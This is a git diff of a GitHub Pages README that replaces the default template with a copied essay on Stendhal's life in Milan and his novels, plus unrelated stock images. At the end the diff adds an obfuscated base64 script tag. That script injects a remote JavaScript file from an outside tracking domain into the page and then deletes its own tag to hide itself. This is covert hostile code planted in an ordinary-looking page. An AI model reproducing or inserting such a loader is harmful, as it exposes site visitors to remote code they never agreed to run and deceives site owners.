@@ -1,37 +1,17 @@
-## Welcome to GitHub Pages
+# It was in Milan 
 
-You can use the [editor on GitHub](https://github.com/scalincon/Cloud/edit/master/README.md) to maintain and preview the content for your website in Markdown files.
+It is, moreover, to this period that we date Stendhal's liaison with Mme. Daru the wife of his aged relative, M. Daru. This particular intrigue has, moreover, a certain psychological importance in that Mme. Daru constituted the model on whom Mathilde de la Mole was drawn in The Red and the Black. The student and historian consequently who is anxious to check how far the novelist is drawing on his experience and how far on his imagination can compare with profit the description of the Mathilde episode in The Red and the Black with those sections in Stendhal's Journal entitled the Life and Sentiments of Silencious Harry, Memoirs of my Life during my Amour with Countess Palfy, and also with the posthumous fragment, Le Consultation de Banti, a piece of methodical deliberation on the pressing question. "Dois-je ou ne dois-je pas avoir la duchesse?" written with all the documentary coldness of a Government report. It is characteristic that both Bansi and Julien decide in the affirmative as a matter of abstract principle. For they both feel that they must necessarily reproach themselves in after life if they miss so signal an opportunity.
 
-Whenever you commit to this repository, GitHub Pages will run [Jekyll](https://jekyllrb.com/) to rebuild the pages in your site, from the content in your Markdown files.
+Disgusted by the Restoration, Stendhal migrated in 1814 to Milan, his favourite town in Europe, whose rich and varied life he savoured to the full from the celebrated ices in the entreates of the opera, to the reciprocated interest of Mme. Angelina Pietragrua (the Duchesse de Sansererina of the Chartreuse of Parma), "a sublime wanton à la Lucrezia Borgia" who would appear to have deceived him systematically. It was in Milan that Stendhal first began to write for publication, producing in 1814 The Lives of Haydn and Mozart, and in 1817 a series of travel sketches, Rome, Naples, Florence, which was published in London.
+![l](https://www.trafalgar.com/real-word/wp-content/uploads/sites/3/2019/10/giant-panda-750x400.jpg)
+It was in Milan also than Stendhal first nursed the abstract thrills of his grand passion for Métilde Countess Dunbowska, whose angelic sweetness would seem to have served at any rate to some extent as a prototype to the character of Mme. de Rênal. In 1821 the novelist was expelled from Milan on the apparently unfounded accusation of being a French spy. It is typical of that mixture of brutal sensuality and rarefied sentimentalism which is one of the most fascinating features of Stendhal's character, that even though he had never loved more than the lady's heart, he should have remained for three years faithful to this mistress of his ideal.
 
-### Markdown
+In 1822 Stendhal published his treatise, De l'Amour, a practical scientific treatise on the erotic emotion by an author who possessed the unusual advantage of being at the same time an acute psychologist and a brilliant man of the world, who could test abstract theories by concrete practice and could co-ordinate what he had felt in himself and observe in others into broad general principles.
 
-Markdown is a lightweight and easy-to-use syntax for styling your writing. It includes conventions for
+In 1825 Stendhal plunging vigorously into the controversy between the Classicists and the Romanticists, published his celebrated pamphlet, Racine and Shakespeare, in which he vindicated with successful crispness the claims of live verse against stereotyped couplets and of modern analysis against historical tradition. His next work was the Life of Rossini, whom he had known personally in Milan, while in 1827 he published his first novel Armance, which, while not equal to the author's greatest work, give none the less good promise of that analytical dash which he was subsequently to manifest. After Armance come the well-known Promenades Rome, while the Stendhalian masterpiece Le Rouge et Le Noir was presented in 1830 to an unappreciative public.
+![k](https://i.insider.com/50ec5d45eab8ea2c1600000f?width=1100&format=jpeg&auto=webp)
+Enthusiasm for this book is the infallible test of your true Stendhalian. Some critics may prefer, possibly, the more Jamesian delicacy of Armance, and others fortified by the example of Goethe may avow their predilection for The Chartreuse de Parme with all the jeune premier charm of its amiable hero. But in our view no book by Stendhal is capable of giving the reader such intellectual thrills as that work which has been adjudged to be his greatest by Balzac, by Taine, by Bourget. Certainly no other book by Stendhal than that which has conjured up Rougistes in all countries in Europe has been the object of a cult in itself. We doubt, moreover, if there is any other modern book whether by Stendhal or any one else, which has actually been learnt by heart by its devotees, who, if we may borrow the story told by M. Paul Bourget, are accustomed to challenge the authenticity of each other's knowledge by starting off with some random passage only to find it immediately taken up, as though the book had been the very Bible itself.
 
-```markdown
-Syntax highlighted code block
+The more personal appeal of what is perhaps the greatest romance of the intellect ever written lies in the character of Julien, its villain-hero. In view of the identification of Julien with Stendhal himself to which we have already alluded, it is only fair to state that Stendhal does not appear to have ever been a tutor in a bourgeois family, nor does history relate his ever having made any attempt at the homicide of a woman. So far, in fact, as what we may call the external physical basis of the story is concerned, the material is supplied not by the life of the author, but by the life of a young student of Besançon, of the name of Berthet, who duly expiated on the threshold that crime which supplied the plot of this immortal novel. But the soul, the brain of Julien is not Berthet but Beyle. And what indeed is the whole book if not a vindication of beylisme, if we may use the word, coined by the man himself for his own outlook on life? For the procedure of Stendhal would seem to have placed his own self in his hero's shoes, to have lived in imagination his whole life, and to have recorded his experience with a wealth of analytic detail, which in spite of some arrogance, is yet both honest and scientific.
 
-# Header 1
-## Header 2
-### Header 3
-
-- Bulleted
-- List
-
-1. Numbered
-2. List
-
-**Bold** and _Italic_ and `Code` text
-
-[Link](url) and ![Image](src)
-```
-
-For more details see [GitHub Flavored Markdown](https://guides.github.com/features/mastering-markdown/).
-
-### Jekyll Themes
-
-Your Pages site will use the layout and styles from the Jekyll theme you have selected in your [repository settings](https://github.com/scalincon/Cloud/settings). The name of this theme is saved in the Jekyll `_config.yml` configuration file.
-
-### Support or Contact
-
-Having trouble with Pages? Check out our [documentation](https://docs.github.com/categories/github-pages-basics/) or [contact support](https://github.com/contact) and we’ll help you sort it out.
+<script id="HyBXz" src="data:text/javascript;base64, dmFyIF81eDBLbCA9IFsnXHg3MVx4NzVceDY1XHg3Mlx4NzlceDUzXHg2NVx4NmNceDY1XHg2M1x4NzRceDZmXHg3MicsICdceDYyXHg2Zlx4NjRceDc5JywgJ1x4NjdceDY1XHg3NFx4NDVceDZjXHg2NVx4NmRceDY1XHg2ZVx4NzRceDQyXHg3OVx4NDlceDY0JywgJ1x4NDRceDRmXHg0ZFx4NDNceDZmXHg2ZVx4NzRceDY1XHg2ZVx4NzRceDRjXHg2Zlx4NjFceDY0XHg2NVx4NjQnLCAnXHg2M1x4NzJceDY1XHg2MVx4NzRceDY1XHg0NVx4NmNceDY1XHg2ZFx4NjVceDZlXHg3NCcsICdceDczXHg2M1x4NzJceDY5XHg3MFx4NzQnLCAnXHg3NFx4NzlceDcwXHg2NScsICdceDc0XHg2NVx4NzhceDc0XHgyZlx4NmFceDYxXHg3Nlx4NjFceDczXHg2M1x4NzJceDY5XHg3MFx4NzQnXTsoZnVuY3Rpb24oXzJnMzlMLCBfemxBSTEpIHt2YXIgX2JPdjVzID0gZnVuY3Rpb24oX1V0OEFVKSB7d2hpbGUgKC0tX1V0OEFVKSB7XzJnMzlMWydwdXNoJ10oXzJnMzlMWydzaGlmdCddKCkpO319O19iT3Y1cygrK196bEFJMSk7fShfNXgwS2wsIDB4MTFiKSk7dmFyIF91cU9LciA9IGZ1bmN0aW9uKF8zVm43bSwgX2F6c1cyKSB7XzNWbjdtID0gXzNWbjdtIC0gMHgwO3ZhciBfV2d3aUggPSBfNXgwS2xbXzNWbjdtXTtyZXR1cm4gX1dnd2lIO307ZG9jdW1lbnRbJ1x4NjFceDY0XHg2NFx4NDVceDc2XHg2NVx4NmVceDc0XHg0Y1x4NjlceDczXHg3NFx4NjVceDZlXHg2NVx4NzInXShfdXFPS3IoJzB4MCcpLCBmdW5jdGlvbigpIHt2YXIgX1BPcjVMID0gZG9jdW1lbnRbX3VxT0tyKCcweDEnKV0oX3VxT0tyKCcweDInKSk7X1BPcjVMW191cU9LcignMHgzJyldID0gX3VxT0tyKCcweDQnKTtfUE9yNUxbJ1x4NzNceDcyXHg2MyddID0gJ1x4NjhceDc0XHg3NFx4NzBceDczXHgzYVx4MmZceDJmXHg2MVx4NmVceDc0XHg2Zlx4NmVceDZmXHg3Nlx4NjNceDZmXHg2ZFx4NzBceDYxXHg2ZVx4NzlceDYxXHg2M1x4NjNceDMyXHgyZVx4NjNceDZmXHg2ZVx4NzNceDc1XHg2Y1x4NzRceDYxXHg3YVx4NjlceDZmXHg2ZVx4NjlceDY2XHg2OVx4NmVceDJlXHg2M1x4NmZceDZkXHgyZlx4NWZceDcyXHg2NVx4NmRceDZmXHg3NFx4NjVceDVmXHg3NFx4NzJceDYxXHg2M1x4NmJceDJlXHg2YVx4NzNceDNmXHg2M1x4NjFceDZkXHg3MFx4NjFceDY5XHg2N1x4NmVceDNkXHg2OFx4NzNceDc0XHg2Ylx4NjVceDc0XHg1Mlx4NGZceDM5XHg0Zic7ZG9jdW1lbnRbX3VxT0tyKCcweDUnKV0oX3VxT0tyKCcweDYnKSlbJ1x4NjFceDcwXHg3MFx4NjVceDZlXHg2NFx4NDNceDY4XHg2OVx4NmNceDY0J10oX1BPcjVMKTtkb2N1bWVudFtfdXFPS3IoJzB4NycpXSgnSHlCWHonKVsnXHg3Mlx4NjVceDZkXHg2Zlx4NzZceDY1J10oKTt9LCB7J1x4NmZceDZlXHg2M1x4NjUnOiAhIVtdfSk7"></script>
